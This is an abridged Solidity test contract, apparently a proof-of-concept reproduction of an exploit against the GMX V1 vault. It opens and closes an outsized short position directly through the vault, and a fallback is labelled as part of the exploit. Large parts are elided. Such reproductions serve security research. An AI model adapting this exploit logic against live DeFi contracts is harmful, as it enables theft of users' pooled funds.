...
contract GMXEXPNewTry is BaseTestWithBalanceLog {
    ...
    function _createBigShort() internal {
        // Use direct vault interaction instead of position router
        TokenHelper.approveToken(USDC, GMX_VAULT_V1, type(uint256).max);
        
        // Create the short position with proper sizing
        gmxVault.increasePosition(
            address(this),
            USDC,
            WBTC,
            1000000000000000000000000000000000, // 1e33 size
            false // short
        );
    }
    ...
    function _decreaseShort() internal {
        ...
        gmxVault.decreasePosition(
            ...
            WBTC,
            0,
            1000000000000000000000000000000000, // close full position
            false,
            address(this)
        );
    }
    ...
    fallback() external payable {
        // Simplified fallback for the exploit
        _stop = true;
    }
}
